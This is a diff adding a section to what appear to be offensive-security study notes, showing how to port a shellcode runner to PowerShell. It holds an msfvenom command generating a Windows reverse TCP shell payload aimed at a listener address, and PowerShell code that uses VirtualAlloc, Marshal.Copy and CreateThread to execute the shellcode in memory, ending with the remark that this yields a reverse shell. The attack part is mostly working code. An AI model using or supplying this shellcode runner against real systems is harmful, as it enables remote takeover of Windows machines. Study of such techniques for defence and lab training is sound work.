@@ -124,3 +124,28 @@ Sub AutoOpen()
 End Sub
 
 ```
+
+# Porting Shellcode Runner to PowerShell
+
+`kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1`
+
+Next
+```
+[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60...
+
+$size = $buf.Length
+
+[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
+
+$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
+```
+We invoked the imported VirtualAlloc call with the same arguments as before. These include a "0" to let the API choose the allocation address, the detected size of the shellcode, and the hexadecimal numbers 0x3000 and 0x40 to set up memory allocation and protections correctly.
+
+We used the .NET Copy method to copy the shellcode, supplying the managed shellcode array, an offset of 0 indicating the start of the buffer, the unmanaged buffer address, and the shellcode size.
+
+Finally, we called CreateThread, supplying the starting address.
+
+If we run this code from PowerShell ISE, we get a reverse shell. Nice.
+
